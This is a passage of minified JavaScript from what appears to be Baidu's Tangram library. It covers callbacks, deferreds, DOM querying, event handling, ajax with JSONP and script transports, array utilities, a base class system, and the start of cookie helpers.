r=this.length;(n|=0)<0&&(n=Math.max(0,r+n));for(;n<r;n++)if(n in this&&this[n]===e)return n;return-1}}),t.createChain("Callbacks",function(e){var n=e;return t.type(e)==="string"&&(n={},t.forEach(e.split(/\s/),function(e){n[e]=!0})),new t.Callbacks.$Callbacks(n)},function(e){var n=t.extend({},e||{}),r=[],i=[],s=0,o,u,a,f,l=function(e,t){var u,l;if(!i||!r)return;o=n.memory&&e,a=!0,i.push(e);if(f)return;f=!0;while(u=i.shift())for(s=t||0;l=r[s];s++)if(l.apply(u[0],u[1])===!1&&n.stopOnFalse){o=!1;break}f=!1,n.once&&(r=[])},c={add:function(){if(!r)return this;var e=r&&r.length;return function i(e){var s=e.length,o,u;for(var a=0,u;a<s;a++){if(!(u=e[a]))continue;o=t.type(u),o==="function"?(!n.unique||!c.has(u))&&r.push(u):u&&u.length&&o!=="string"&&i(u)}}(arguments),!f&&o&&l(o,e),this},remove:function(){if(!r)return this;var e;return t.forEach(arguments,function(n){while((e=t.array(r).indexOf(n))>-1)r.splice(e,1),f&&e<s&&s--}),this},has:function(e){return t.array(r).indexOf(e)>-1},empty:function(){return r=[],this},disable:function(){return r=i=o=undefined,this},disabled:function(){return!r},lock:function(){return u=!0,!o&&c.disable(),this},fired:function(){return a},fireWith:function(e,t){return a&&n.once||u?this:(t=t||[],t=[e,t.slice?t.slice():t],l(t),this)},fire:function(){return c.fireWith(this,arguments),this}};return c}),t.createChain("Deferred",function(e){return new t.Deferred.$Deferred(e)},function(e){var n=this,r="pending",i=[["resolve","done",t.Callbacks("once memory"),"resolved"],["reject","fail",t.Callbacks("once memory"),"rejected"],["notify","progress",t.Callbacks("memory")]],s={state:function(){return r},always:function(){return n.done(arguments).fail(arguments),this},then:function(){var e=arguments;return t.Deferred(function(r){t.forEach(i,function(i,s){var o=i[0],u=e[s];n[i[1]](t.type(u)==="function"?function(){var e=u.apply(this,arguments);e&&t.type(e.promise)==="function"?e.promise().done(r.resolve).fail(r.reject).progress(r.notify):r[o+"With"](this===n?r:this,[e])}:r[o])})}).promise()},promise:function(e){return e!=null?t.extend(e,s):s}};s.pipe=s.then,t.forEach(i,function(e,t){var o=e[2],u=e[3];s[e[1]]=o.add,u&&o.add(function(){r=u},i[t^1][2].disable,i[2][2].lock),n[e[0]]=o.fire,n[e[0]+"With"]=o.fireWith}),s.promise(n),e&&e.call(n,n)}),t.when=t.when||function(e){function f(e,t,n){return function(r){t[e]=this,n[e]=arguments.length>1?arguments:r,n===o?s.notifyWith(t,n):--i||s.resolveWith(t,n)}}var n=arguments,r=arguments.length,i=r!==1||e&&t.type(e.promise)==="function"?r:0,s=i===1?e:t.Deferred(),o,u,a;if(r>1){o=new Array(r),u=new Array(r),a=new Array(r);for(var l=0;l<r;l++)n[l]&&t.type(n[l].promise)==="function"?n[l].promise().done(f(l,a,n)).fail(s.reject).progress(f(l,u,o)):--i}return!i&&s.resolveWith(a,n),s.promise()},t.global=t.global||function(){var e=t._global_=window[t.guid],n=e._=e._||{};return function(e,t,r){return typeof t!="undefined"?(r||(t=typeof n[e]=="undefined"?t:n[e]),n[e]=t):e&&typeof n[e]=="undefined"&&(n[e]={}),n[e]}}(),t.browser=t.browser||function(){var e=navigator.userAgent,n={isStrict:document.compatMode=="CSS1Compat",isGecko:/gecko/i.test(e)&&!/like gecko/i.test(e),isWebkit:/webkit/i.test(e)};try{/(\d+\.\d+)/.test(external.max_version)&&(n.maxthon=+RegExp.$1)}catch(r){}switch(!0){case/msie (\d+\.\d+)/i.test(e):n.ie=document.documentMode||+RegExp.$1;break;case/chrome\/(\d+\.\d+)/i.test(e):n.chrome=+RegExp.$1;break;case/(\d+\.\d)?(?:\.\d)?\s+safari\/?(\d+\.\d+)?/i.test(e)&&!/chrome/i.test(e):n.safari=+(RegExp.$1||RegExp.$2);break;case/firefox\/(\d+\.\d+)/i.test(e):n.firefox=+RegExp.$1;break;case/opera(?:\/| )(\d+(?:\.\d+)?)(.+?(version\/(\d+(?:\.\d+)?)))?/i.test(e):n.opera=+(RegExp.$4||RegExp.$1)}return t.extend(t,n),n}(),t.id=function(){var e=t.global("_maps_id"),n=t.key;return window[t.guid]._counter=window[t.guid]._counter||1,function(r,i){var s,o=t.isString(r),u=t.isObject(r),a=u?r[n]:o?r:"";if(t.isString(i))switch(i){case"get":return u?a:e[a];case"remove":case"delete":if(s=e[a])t.isElement(s)&&t.browser.ie<8?s.removeAttribute(n):delete s[n],delete e[a];return a;default:return o?((s=e[a])&&delete e[a],s&&(e[s[n]=i]=s)):u&&(a&&delete e[a],e[r[n]=i]=r),i}return u?(!a&&(e[r[n]=a=t.id()]=r),a):o?e[r]:"TANGRAM_"+t._global_._counter++}}(),t._util_=t._util_||{},t._util_.support=t._util_.support||function(){var e=document.createElement("div"),t,n,r,i,s;return e.setAttribute("className","t"),e.innerHTML=' <link/><table></table><a href="/a">a</a><input type="checkbox"/>',n=e.getElementsByTagName("A")[0],n.style.cssText="top:1px;float:left;opacity:.5",i=document.createElement("select"),s=i.appendChild(document.createElement("option")),r=e.getElementsByTagName("input")[0],r.checked=!0,t={dom:{div:e,a:n,select:i,opt:s,input:r}},t}(),t.createChain("event",function(){var e={};return function(n,r){switch(t.type(n)){case"object":return e.originalEvent===n?e:e=new t.event.$Event(n);case"$Event":return n}}}(),function(e){var n,r,i,s=this;this._type_="$Event";if(typeof e=="object"&&e.type){s.originalEvent=n=e;for(var o in n)typeof n[o]!="function"&&(s[o]=n[o]);n.extraData&&t.extend(s,n.extraData),s.target=s.srcElement=n.srcElement||(r=n.target)&&(r.nodeType==3?r.parentNode:r),s.relatedTarget=n.relatedTarget||(r=n.fromElement)&&(r===s.target?n.toElement:r),s.keyCode=s.which=n.keyCode||n.which,!s.which&&n.button!==undefined&&(s.which=n.button&1?1:n.button&2?3:n.button&4?2:0);var u=document.documentElement,a=document.body;s.pageX=n.pageX||n.clientX+(u&&u.scrollLeft||a&&a.scrollLeft||0)-(u&&u.clientLeft||a&&a.clientLeft||0),s.pageY=n.pageY||n.clientY+(u&&u.scrollTop||a&&a.scrollTop||0)-(u&&u.clientTop||a&&a.clientTop||0),s.data}this.timeStamp=(new Date).getTime()}).extend({stopPropagation:function(){var e=this.originalEvent;e&&(e.stopPropagation?e.stopPropagation():e.cancelBubble=!0)},preventDefault:function(){var e=this.originalEvent;e&&(e.preventDefault?e.preventDefault():e.returnValue=!1)}}),t.merge=function(e,t){var n=e.length,r=0;if(typeof t.length=="number")for(var i=t.length;r<i;r++)e[n++]=t[r];else while(t[r]!==undefined)e[n++]=t[r++];return e.length=n,e},t.array.extend({unique:function(e){var t=this.length,n=this.slice(0),r,i;"function"!=typeof e&&(e=function(e,t){return e===t});while(--t>0){i=n[t],r=t;while(r--)if(e(i,n[r])){n.splice(t,1);break}}t=this.length=n.length;for(r=0;r<t;r++)this[r]=n[r];return this}}),t.query=t.query||function(){function f(n,o){var u,a,f,l,c,h,p,d,v=[];return e.test(n)?(f=RegExp.$2,c=RegExp.$1||"*",t.forEach(o.getElementsByTagName(c),function(e){e.id==f&&v.push(e)})):r.test(n)||n=="*"?t.merge(v,o.getElementsByTagName(n)):i.test(n)?(p=[],c=RegExp.$1,h=RegExp.$2,u=" "+h+" ",o.getElementsByClassName?p=o.getElementsByClassName(h):t.forEach(o.getElementsByTagName("*"),function(e){e.className&&~(" "+e.className+" ").indexOf(u)&&p.push(e)}),c&&(c=c.toUpperCase())?t.forEach(p,function(e){e.tagName.toUpperCase()===c&&v.push(e)}):t.merge(v,p)):s.test(n)&&(d=n.substr(1).split("."),t.forEach(o.getElementsByTagName("*"),function(e){e.className&&(u=" "+e.className+" ",a=!0,t.forEach(d,function(e){~u.indexOf(" "+e+" ")||(a=!1)}),a&&v.push(e))})),v}function l(e,r){var i,s=e,o="__tangram__",u=[];return!r&&n.test(s)&&(i=document.getElementById(s.substr(1)))?[i]:(r=r||document,r.querySelectorAll?(r.nodeType==1&&!r.id?(r.id=o,i=r.querySelectorAll("#"+o+" "+s),r.id=""):i=r.querySelectorAll(s),i):~s.indexOf(" ")?(t.forEach(f(s.substr(0,s.indexOf(" ")),r),function(e){t.merge(u,l(s.substr(s.indexOf(" ")+1),e))}),u):f(s,r))}var e=/^(\w*)#([\w\-\$]+)$/,n=/^#([\w\-\$]+)$/,r=/^\w+$/,i=/^(\w*)\.([\w\-\$]+)$/,s=/^(\.[\w\-\$]+)+$/,o=/\s*,\s*/,u=/\s+/g,a=Array.prototype.slice;return function(e,n,r){if(!e||typeof e!="string")return r||[];var i=[];return e=e.replace(u," "),r&&t.merge(i,r)&&(r.length=0),t.forEach(e.indexOf(",")>0?e.split(o):[e],function(e){t.merge(i,l(e,n))}),t.merge(r||[],t.array(i).unique())}}(),t.createChain("dom",function(e,n){var r,i=new t.dom.$DOM(n);if(!e)return i;if(e._type_=="$DOM")return e;if(e.nodeType||e==e.window)return i[0]=e,i.length=1,i;if(e.length&&i.toString.call(e)!="[object String]")return t.merge(i,e);if(typeof e=="string")if(e.charAt(0)=="<"&&e.charAt(e.length-1)==">"&&e.length>2){var s=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,o=n&&n._type_==="$DOM"?n[0]:n,u=s.exec(e);o=o&&o.nodeType?o.ownerDocument||o:document,u=u?[o.createElement(u[1])]:t.dom.createElements?t.dom.createElements(e):[],t.merge(i,u)}else t.query(e,n,i);else if(typeof e=="function")return i.ready?i.ready(e):i;return i},function(e){this.length=0,this._type_="$DOM",this.context=e||document}).extend({size:function(){return this.length},splice:function(){},get:function(e){return typeof e=="number"?e<0?this[this.length+e]:this[e]:Array.prototype.slice.call(this,0)},toArray:function(){return this.get()}}),t.dom.extend({each:function(e){t.check("function","baidu.dom.each");var n,r,i=this.length;for(n=0;n<i;n++){r=e.call(this[n],n,this[n],this);if(r===!1||r=="break")break}return this}}),t._util_.eventBase=t._util_.eventBase||{},void function(e,t){if(e.listener)return;t=e.listener={},window.addEventListener?t.add=function(e,t,n){e.addEventListener(t,n,!1)}:window.attachEvent&&(t.add=function(e,t,n){e.attachEvent("on"+t,n)})}(t._util_.eventBase),void function(e,n){if(e.queue)return;var r=t.id,i=e.queue={},s=i.attaCache=t.global("eventQueueCache"),o=e.listener;i.get=function(e,t,n,i){var o=r(e),u;return s[o]||(s[o]={}),u=s[o],t?(!u[t]&&n&&this.setupCall(e,t,n,u[t]=[],i),u[t]||[]):u},i.add=function(e,t,n,r,i){this.get(e,t,n,i).push(r)},i.remove=function(e,t,n){var r,i;if(t){var r=this.get(e,t);if(n)for(var s=r.length-1;s>=0;s--)r[s].orig==n&&r.splice(s,1);else r.length=0}else{var i=this.get(e);for(var s in i)i[s].length=0}},i.handlerList=function(e,n){var r=[];for(var i=0,s;s=n[i];i++){if(s.delegate&&t.dom(s.delegate,e).size()<1)continue;r.push(s)}return r},i.call=function(e,n,r,s){if(r){if(!r.length)return;var o=[].slice.call(arguments,1),u=[];o.unshift(s=t.event(s||n)),s.type=n,s.currentTarget||(s.currentTarget=e),s.target||(s.target=e),r=i.handlerList(e,r);for(var a=0,f,l=r.length;a<l;a++)if(f=r[a])f.pkg.apply(e,o),f.one&&u.unshift(a);if(u.length)for(var a=0,l=u.length;a<l;a++)this.remove(e,n,r[a].fn)}else r=this.get(e,n),this.call(e,n,r,s)},i.setupCall=function(){var e=function(e,t,n,r){o.add(e,n,function(n){i.call(e,t,r,n)})};return function(n,r,i,s,o){if(!o)e(n,r,i,s);else{n=t.dom(o,n);for(var u=0,a=n.length;u<a;u++)e(n[u],r,i,s)}}}()}(t._util_.eventBase,t.event),void function(e,n){if(e.core)return;var r=e.queue,i=e.core={},s=n.special={},o=[].push,u=function(e,t){for(var n=0,r=t.length;n<r;n++)if(t.get(n).contains(e))return t[n]};i.build=function(e,n,r,i,a){var f;return i&&(f=t.dom(i,e)),n in s&&s[n].pack&&(r=s[n].pack(r)),function(n){var s=t.dom(n.target),l=[n],c;a&&!n.data&&(n.data=a),n.triggerData&&o.apply(l,n.triggerData);if(!f)return n.result=r.apply(e,l);for(var h=0;h<2;h++){if(c=u(n.target,f))return n.result=r.apply(c,l);f=t.dom(i,e)}}},i.add=function(e,t,n,i,o,u){var a=this.build(e,t,n,i,o),f,l;l=t,t in s&&(f=s[t].attachElements,l=s[t].bindType||t),r.add(e,t,l,{type:t,pkg:a,orig:n,one:u,delegate:i},f)},i.remove=function(e,t,n,i){r.remove(e,t,n,i)}}(t._util_.eventBase,t.event),t.dom.extend({on:function(e,n,r,i,s){var o=t._util_.eventBase.core;return typeof n=="object"&&n?(i=r,r=n,n=null):typeof r=="function"?(i=r,r=null):typeof n=="function"&&(i=n,n=r=null),typeof e=="string"?(e=e.split(/[ ,]+/),this.each(function(){t.forEach(e,function(e){o.add(this,e,i,n,r,s)},this)})):typeof e=="object"&&(i&&(i=null),t.forEach(e,function(e,t){this.on(t,n,r,e,s)},this)),this}}),t.dom.g=function(e){return e?"string"==typeof e||e instanceof String?document.getElementById(e):!e.nodeName||e.nodeType!=1&&e.nodeType!=9?null:e:null},t.event.on=t.on=function(e,n,r){return typeof e=="string"&&(e=t.dom.g(e)),t.dom(e).on(n.replace(/^\s*on/,""),r),e},void function(){function w(e){var n,r;if(!e||t.type(e)!=="string")return null;try{window.DOMParser?(r=new DOMParser,n=r.parseFromString(e,"text/xml")):(n=new ActiveXObject("Microsoft.XMLDOM"),n.async="false",n.loadXML(e))}catch(i){n=undefined}if(!n||!n.documentElement||n.getElementsByTagName("parsererror").length)throw new Error("Invalid XML: "+e);return n}function E(e){if(!e||t.type(e)!=="string")return null;e=t.string(e).trim();if(window.JSON&&window.JSON.parse)return window.JSON.parse(e);if(l.test(e.replace(h,"@").replace(p,"]").replace(c,"")))return(new Function("return "+e))();throw new Error("Invalid JSON: "+e)}function S(e){e&&/\S/.test(e)&&(window.execScript||function(e){window.eval.call(window,e)})(e)}function x(e){return function(n,r){t.type(n)!=="string"&&(r=n,n="*");var i=n.toLowerCase().split(/\s+/),s,o;if(t.type(r)==="function")for(var u=0,a;a=i[u];u++)s=/^\+/.test(a),s&&(a=a.substr(1)||"*"),o=e[a]=e[a]||[],o[s?"unshift":"push"](r)}}function T(e,t,n){var r,i,s,o,u=e.contents,a=e.dataTypes,f=e.responseFields;for(i in f)i in n&&(t[f[i]]=n[i]);while(a[0]==="*")a.shift(),r===undefined&&(r=e.mimeType||t.getResponseHeader("content-type"));if(r)for(i in u)if(u[i]&&u[i].test(r)){a.unshift(i);break}if(a[0]in n)s=a[0];else{for(i in n){if(!a[0]||e.converters[i+" "+a[0]]){s=i;break}o||(o=i)}s=s||o}if(s)return s!==a[0]&&a.unshift(s),n[s]}function N(e,t){var n=e.dataTypes.slice(),r=n[0],i={},s,o;e.dataFilter&&(t=e.dataFilter(t,e.dataType));if(n[1])for(var u in e.converters)i[u.toLowerCase()]=e.converters[u];for(var u=0,a;a=n[++u];)if(a!=="*"){if(r!=="*"&&r!==a){s=i[r+" "+a]||i["* "+a];if(!s)for(var f in i){o=f.split(" ");if(o[1]===a){s=i[r+" "+o[0]]||i["* "+o[0]];if(s){s===!0?s=i[f]:i[f]!==!0&&(a=o[0],n.splice(u--,0,a));break}}}if(s!==!0)if(s&&e["throws"])t=s(t);else try{t=s(t)}catch(l){return{state:"parsererror",error:s?l:"No conversion from "+r+" to "+a}}}r=a}return{state:"success",data:t}}function C(e,t,n,r,i,s){i=i||t.dataTypes[0],s=s||{},s[i]=!0;var o,u=e[i],a=u?u.length:0,f=e===v;for(var l=0;l<a&&(f||!o);l++)o=u[l](t,n,r),typeof o=="string"&&(!f||s[o]?o=undefined:(t.dataTypes.unshift(o),o=C(e,t,n,r,o,s)));return(f||!o)&&!s["*"]&&(o=C(e,t,n,r,"*",s)),o}function k(e,n){var r=t.ajax.settings.flatOptions||{},i;for(var s in n)n[s]!==undefined&&((r[s]?e:i||(i={}))[s]=n[s]);i&&t.extend(!0,e,i)}function L(e,n,r){r=t.type(r)==="function"?r():typeof r=="undefined"||r==null?"":r,e.push(encodeURIComponent(n)+"="+encodeURIComponent(r))}function A(e,n,r,i){if(t.type(r)==="array")t.forEach(r,function(t,r){i||o.test(n)?L(e,n,t):A(e,n+"["+(typeof t=="object"?r:"")+"]",t,i)});else if(!i&&t.type(r)==="object")for(var s in r)A(e,n+"["+s+"]",r[s],i);else L(e,n,r)}function B(){try{return new window.XMLHttpRequest}catch(e){}}function j(){try{return new window.ActiveXObject("Microsoft.XMLHTTP")}catch(e){}}var e=document.URL,n=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,r=/^\/\//,i=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,s=/#.*$/,o=/\[\]$/,u=/^(?:GET|HEAD)$/,a=/([?&])_=[^&]*/,f=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,l=/^[\],:{}\s]*$/,c=/(?:^|:|,)(?:\s*\[)+/g,h=/\\(?:["\\\/bfnrt]|u[\da-fA-F]{4})/g,p=/"[^"\\\r\n]*"|true|false|null|-?(?:\d\d*\.|)\d+(?:[eE][\-+]?\d+|)/g,d=["*/"]+["*"],v={},m={},g={},y={},b=i.exec(e.toLowerCase())||[];t.createChain("ajax",function(e,n){function H(e,t,n,r){var i=t,s,u,a,f,c;if(x===2)return;x=2,P&&clearTimeout(P),_=undefined,O=r||"",D.readyState=e>0?4:0,n&&(f=T(o,D,n));if(e>=200&&e<300||e===304)o.ifModified&&(c=D.getResponseHeader("Last-Modified"),c&&(g[h]=c),c=D.getResponseHeader("Etag"),c&&(y[h]=c)),e===304?(i="notmodified",s=!0):(s=N(o,f),i=s.state,u=s.data,a=s.error,s=!a);else{a=i;if(!i||e)i="error",e<0&&(e=0)}D.status=e,D.statusText=""+(t||i),s?w.resolveWith(l,[u,i,D]):w.rejectWith(l,[D,i,a]),D.statusCode(S),S=undefined,E.fireWith(l,[D,i])}t.object.isPlain(e)&&(n=e,e=undefined),n=n||{};var o=t.ajax.setup({},n),l=o.context||o,c,h,p,w=t.Deferred(),E=t.Callbacks("once memory"),S=o.statusCode||{},x=0,k={},L={},A="canceled",O,M,_,D=t.extend(new t.ajax.$Ajax(e,o),{readyState:0,setRequestHeader:function(e,t){if(!x){var n=e.toLowerCase();e=k[n]=k[n]||e,L[e]=t}},getAllResponseHeaders:function(){return x===2?O:null},getResponseHeader:function(e){var t;if(x===2){if(!M){M={};while(t=f.exec(O))M[t[1].toLowerCase()]=t[2]}t=M[e.toLowerCase()]}return t===undefined?null:t},overrideMimeType:function(e){return!x&&(o.mimeType=e),this},abort:function(e){return e=e||A,_&&_.abort(e),H(0,e),this}}),P;w.promise(D),D.success=D.done,D.error=D.fail,D.complete=E.add,D.statusCode=function(e){if(e)if(x<2)for(var t in e)S[t]=[S[t],e[t]];else D.always(e[D.status]);return this},o.url=((e||o.url)+"").replace(s,"").replace(r,b[1]+"//"),o.dataTypes=t.string(o.dataType||"*").trim().toLowerCase().split(/\s+/),o.crossDomain==null&&(p=i.exec(o.url.toLowerCase()),o.crossDomain=!(!p||p[1]==b[1]&&p[2]==b[2]&&(p[3]||(p[1]==="http:"?80:443))==(b[3]||(b[1]==="http:"?80:443)))),o.data&&o.processData&&t.type(o.data)!=="string"&&(o.data=t.ajax.param(o.data,o.traditional)),C(v,o,n,D);if(x===2)return"";c=o.global,o.type=o.type.toUpperCase(),o.hasContent=!u.test(o.type);if(!o.hasContent){o.data&&(o.url+=(~o.url.indexOf("?")?"&":"?")+o.data,delete o.data),h=o.url;if(o.cache===!1){var B=(new Date).getTime(),j=o.url.replace(a,"$1_="+B);o.url=j+(j===o.url?(~o.url.indexOf("?")?"&":"?")+"_="+B:"")}}(o.data&&o.hasContent&&o.contentType!==!1||n.contentType)&&D.setRequestHeader("Content-Type",o.contentType),o.ifModified&&(h=h||o.url,g[h]&&D.setRequestHeader("If-Modified-Since",g[h]),y[h]&&D.setRequestHeader("If-None-Match",y[h])),D.setRequestHeader("Accept",o.dataTypes[0]&&o.accepts[o.dataTypes[0]]?o.accepts[o.dataTypes[0]]+(o.dataTypes[0]!=="*"?", "+d+"; q=0.01":""):o.accepts["*"]);for(var F in o.headers)D.setRequestHeader(F,o.headers[F]);if(!o.beforeSend||o.beforeSend.call(l,D,o)!==!1&&x!==2){A="abort";for(var F in{success:1,error:1,complete:1})D[F](o[F]);_=C(m,o,n,D);if(!_)H(-1,"No Transport");else{D.readyState=1,o.async&&o.timeout>0&&(P=setTimeout(function(){D.abort("timeout")},o.timeout));try{x=1,_.send(L,H)}catch(I){if(!(x<2))throw I;H(-1,I)}}return D}return D.abort()},function(e,t){this.url=e,this.options=t}),t.ajax.settings={url:e,isLocal:n.test(b[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded; charset=UTF-8",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":d},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":window.String,"text html":!0,"text json":E,"text xml":w},flatOptions:{context:!0,url:!0}},t.ajax.setup=function(e,n){return n?k(e,t.ajax.settings):(n=e,e=t.ajax.settings),k(e,n),e},t.ajax.param=function(e,n){var r=[];if(t.type(e)==="array")t.forEach(e,function(e){L(r,e.name,e.value)});else for(var i in e)A(r,i,e[i],n);return r.join("&").replace(/%20/g,"+")},t.ajax.prefilter=x(v),t.ajax.transport=x(m);var O=[],M=/(=)\?(?=&|$)|\?\?/,_=(new Date).getTime();t.ajax.setup({jsonp:"callback",jsonpCallback:function(){var e=O.pop()||t.key+"_"+_++;return this[e]=!0,e}}),t.ajax.prefilter("json jsonp",function(e,n,r){var i,s,o,u=e.data,a=e.url,f=e.jsonp!==!1,l=f&&M.test(a),c=f&&!l&&t.type(u)==="string"&&!(e.contentType||"").indexOf("application/x-www-form-urlencoded")&&M.test(u);if(e.dataTypes[0]==="jsonp"||l||c)return i=e.jsonpCallback=t.type(e.jsonpCallback)==="function"?e.jsonpCallback():e.jsonpCallback,s=window[i],l?e.url=a.replace(M,"$1"+i):c?e.data=u.replace(M,"$1"+i):f&&(e.url+=(/\?/.test(a)?"&":"?")+e.jsonp+"="+i),e.converters["script json"]=function(){return o[0]},e.dataTypes[0]="json",window[i]=function(){o=arguments},r.always(function(){window[i]=s,e[i]&&(e.jsonpCallback=n.jsonpCallback,O.push(i)),o&&t.type(s)==="function"&&s(o[0]),o=s=undefined}),"script"}),t.ajax.setup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(e){return S(e),e}}}),t.ajax.prefilter("script",function(e){e.cache===undefined&&(e.cache=!1),e.crossDomain&&(e.type="GET",e.global=!1)}),t.ajax.transport("script",function(e){if(e.crossDomain){var t,n=document.head||document.getElementsByTagName("head")[0]||document.documentElement;return{send:function(r,i){t=document.createElement("script"),t.async="async",e.scriptCharset&&(t.charset=e.scriptCharset),t.src=e.url,t.onload=t.onreadystatechange=function(e,r){if(r||!t.readyState||/loaded|complete/.test(t.readyState))t.onload=t.onreadystatechange=null,n&&t.parentNode&&n.removeChild(t),t=undefined,!r&&i(200,"success")},n.insertBefore(t,n.firstChild)},abort:function(){t&&t.onload(0,1)}}}});var D,P=0,H=window.ActiveXObject?function(){for(var e in D)D[e](0,1)}:!1;t.ajax.settings.xhr=window.ActiveXObject?function(){return!this.isLocal&&B()||j()}:B,void function(e){t.extend(t._util_.support,{ajax:!!e,cors:!!e&&"withCredentials"in e})}(t.ajax.settings.xhr()),t._util_.support.ajax&&t.ajax.transport(function(e){if(!e.crossDomain||t._util_.support.cors){var n;return{send:function(r,i){var s,o=e.xhr();e.username?o.open(e.type,e.url,e.async,e.username,e.password):o.open(e.type,e.url,e.async);if(e.xhrFields)for(var u in e.xhrFields)o[u]=e.xhrFields[u];e.mimeType&&o.overrideMimeType&&o.overrideMimeType(e.mimeType),!e.crossDomain&&!r["X-Requested-With"]&&(r["X-Requested-With"]="XMLHttpRequest");try{for(var u in r)o.setRequestHeader(u,r[u])}catch(a){}o.send(e.hasContent&&e.data||null),n=function(t,r){var u,a,f,l,c;try{if(n&&(r||o.readyState===4)){n=undefined,s&&(o.onreadystatechange=function(){},H&&delete D[s]);if(r)o.readyState!==4&&o.abort();else{u=o.status,f=o.getAllResponseHeaders(),l={},c=o.responseXML,c&&c.documentElement&&(l.xml=c);try{l.text=o.responseText}catch(h){}try{a=o.statusText}catch(h){a=""}!u&&e.isLocal&&!e.crossDomain?u=l.text?200:404:u===1223&&(u=204)}}}catch(p){!r&&i(-1,p)}l&&i(u,a,l,f)},e.async?o.readyState===4?setTimeout(n,0):(s=++P,H&&(D||(D={},t.dom(window).on("unload",H)),D[s]=n),o.onreadystatechange=n):n()},abort:function(){n&&n(0,1)}}}})}(),t.array.extend({contains:function(e){return!!~this.indexOf(e)}}),t.each=function(e,t,n){var r,i,s,o;if(typeof t=="function"&&e){i=typeof e.length=="number"?e.length:e.byteLength;if(typeof i=="number"){if(Object.prototype.toString.call(e)==="[object Function]")return e;for(r=0;r<i;r++){s=e[r],s===undefined&&(s=e.charAt&&e.charAt(r)),o=t.call(n||s,r,s,e);if(o===!1||o=="break")break}}else if(typeof e=="number")for(r=0;r<e;r++){o=t.call(n||r,r,r,r);if(o===!1||o=="break")break}else if(typeof e=="object")for(r in e)if(e.hasOwnProperty(r)){o=t.call(n||e[r],r,e[r],e);if(o===!1||o=="break")break}}return e},t.array.extend({each:function(e,n){return t.each(this,e,n)},forEach:function(e,n){return t.forEach(this,e,n)}}),t.array.extend({empty:function(){return this.length=0,this}}),t.array.extend({filter:function(e,n){var r=t.array([]),i,s,o,u=0;if(t.type(e)==="function")for(i=0,s=this.length;i<s;i++)o=this[i],e.call(n||this,o,i,this)===!0&&(r[u++]=o);return r}}),t.array.extend({find:function(e){var n,r,i=this.length;if(t.type(e)=="function")for(n=0;n<i;n++){r=this[n];if(e.call(this,r,n,this)===!0)return r}return null}}),t.array.extend({hash:function(e){var t={},n=e&&e.length,r,i;for(r=0,i=this.length;r<i;r++)t[this[r]]=n&&n>r?e[r]:!0;return t}}),t.array.extend({lastIndexOf:function(e,n){t.check(".+(,number)?","baidu.array.lastIndexOf");var r=this.length;(!(n|=0)||n>=r)&&(n=r-1),n<0&&(n+=r);for(;n>=0;n--)if(n in this&&this[n]===e)return n;return-1}}),t.array.extend({map:function(e,n){t.check("function(,.+)?","baidu.array.map");var r=this.length,i=t.array([]);for(var s=0;s<r;s++)i[s]=e.call(n||this,this[s],s,this);return i}}),t.array.extend({remove:function(e){var t=this.length;while(t--)this[t]===e&&this.splice(t,1);return this}}),t.array.extend({removeAt:function(e){return t.check("number","baidu.array.removeAt"),this.splice(e,1)[0]}}),t.base=t.base||{blank:function(){}},t.base.Class=function(){var e=(t._global_=window[t.guid])._instances;return e||(e=t._global_._instances={}),function(){this.guid=t.id(),this._decontrol_||(e[this.guid]=this)}}(),t.extend(t.base.Class.prototype,{toString:t.base.Class.prototype.toString=function(){return"[object "+(this._type_||"Object")+"]"},dispose:function(){delete t._global_._instances[this.guid];if(this._listeners_)for(var e in this._listeners_)this._listeners_[e].length=0,delete this._listeners_[e];for(var n in this)t.isFunction(this[n])?this[n]=t.base.blank:delete this[n];this.disposed=!0},fire:function(e,n){t.isString(e)&&(e=new t.base.Event(e));var r,i,s,o,u=this._listeners_,a=e.type,f=[e].concat(Array.prototype.slice.call(arguments,1));!u&&(u=this._listeners_={}),t.extend(e,n||{}),e.target=e.target||this,e.currentTarget=this,a.indexOf("on")&&(a="on"+a),t.isFunction(this[a])&&this[a].apply(this,f),(r=this._options)&&t.isFunction(r[a])&&r[a].apply(this,f);if(t.isArray(s=u[a]))for(r=s.length-1;r>-1;r--)o=s[r],o&&o.handler.apply(this,f),o&&o.once&&s.splice(r,1);return e.returnValue},on:function(e,n,r){if(!t.isFunction(n))return this;var i,s=this._listeners_;return!s&&(s=this._listeners_={}),e.indexOf("on")&&(e="on"+e),!t.isArray(i=s[e])&&(i=s[e]=[]),s[e].unshift({handler:n,once:!!r}),this},once:function(e,t){return this.on(e,t,!0)},one:function(e,t){return this.on(e,t,!0)},off:function(e,t){var n,r,i=this._listeners_;if(!i)return this;if(typeof e=="undefined"){for(n in i)delete i[n];return this}e.indexOf("on")&&(e="on"+e);if(typeof t=="undefined")delete i[e];else if(r=i[e])for(n=r.length-1;n>=0;n--)r[n].handler===t&&r.splice(n,1);return this}}),t.base.Class.prototype.addEventListener=t.base.Class.prototype.on,t.base.Class.prototype.removeEventListener=t.base.Class.prototype.un=t.base.Class.prototype.off,t.base.Class.prototype.dispatchEvent=t.base.Class.prototype.fire,window.baiduInstance=function(e){return window[t.guid]._instances[e]},t.base.Event=function(e,t){this.type=e,this.returnValue=!0,this.target=t||null,this.currentTarget=null,this.preventDefault=function(){this.returnValue=!1}},t.base.inherits=function(e,t,n){var r,i,s=e.prototype,o=new Function;o.prototype=t.prototype,i=e.prototype=new o;for(r in s)i[r]=s[r];return e.prototype.constructor=e,e.superClass=t.prototype,typeof n=="string"&&(i._type_=n),e.extend=function(t){for(var n in t)i[n]=t[n];return e},e},t.base.register=function(e,t,n){(e._reg_||(e._reg_=[])).push(t);for(var r in n)e.prototype[r]=n[r]},t.cookie=t.cookie||{},t.cookie._isValidKey=function(e){return(new RegExp('^[^\\x00-\\x20\\x7f\\(\\)<>@,;:\\\\\\"\\[\\]\\?=\\{\\}\\/\\u0080-\\uffff]+$')).test(e)},t.cookie.getRaw=function(e){if(t.cookie._isValidKey(e)){var n=new RegExp("(^| )"+e+"=([^;]*)(;|$)"),r=n.exec(document.cookie);if(r)return r[2]||null}return 